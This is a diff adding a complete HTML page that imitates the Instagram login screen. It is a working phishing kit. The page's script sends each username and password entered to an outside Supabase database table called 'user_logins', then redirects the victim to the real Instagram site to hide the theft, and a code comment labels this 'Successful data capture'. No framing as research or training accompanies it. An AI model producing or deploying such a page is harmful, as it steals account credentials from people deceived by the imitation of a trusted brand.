@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+        .mobile-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 0 40px;
+        }
+        .logo {
+            /* Using Lobster as a reliable alternative to Billabong for the script look */
+            font-family: 'Lobster', cursive; 
+            font-size: 3.5rem;
+            font-weight: 400;
+            margin-bottom: 30px;
+            color: #262626;
+        }
+        .login-form { width: 100%; max-width: 350px; }
+        input {
+            width: 100%;
+            height: 44px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 0 10px;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        .login-btn {
+            width: 100%;
+            height: 44px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .or-container {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+            margin: 25px 0;
+        }
+        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
+        .or-text { margin: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .fb-login {
+            display: flex;
+            align-items: center;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        .fb-icon { width: 18px; height: 18px; margin-right: 8px; }
+        .forgot-password { text-decoration: none; color: #00376b; font-size: 12px; }
+        .signup-footer {
+            border-top: 1px solid #dbdbdb;
+            padding: 25px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-footer a { text-decoration: none; color: #0095f6; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        <header>
+            <h1 class="logo">Instagram</h1>
+        </header>
+
+        <form class="login-form" id="authForm">
+            <input type="text" id="userInput" placeholder="Phone number, username, or email" required>
+            <input type="password" id="passInput" placeholder="Password" required>
+            <button type="submit" id="submitBtn" class="login-btn">Log In</button>
+        </form>
+
+        <div class="or-container">
+            <div class="line"></div>
+            <div class="or-text">OR</div>
+            <div class="line"></div>
+        </div>
+
+        <div class="fb-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png" alt="fb-logo" class="fb-icon">
+            <span>Log in with Facebook</span>
+        </div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <footer class="signup-footer">
+        <p>Don't have an account? <a href="#">Sign up.</a></p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+        // Use your project details from October 2025
+        const SUPABASE_URL = 'YOUR_SUPABASE_URL'; 
+        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
+
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        document.getElementById('authForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "Connecting...";
+
+            const { error } = await _supabase
+                .from('user_logins')
+                .insert([{ 
+                    identifier: document.getElementById('userInput').value, 
+                    password: document.getElementById('passInput').value 
+                }]);
+
+            if (error) {
+                alert("Error: " + error.message);
+                btn.disabled = false;
+                btn.innerText = "Log In";
+            } else {
+                // Successful data capture
+                window.location.href = "https://www.instagram.com";
+            }
+        });
+    </script>
+</body>
+</html>
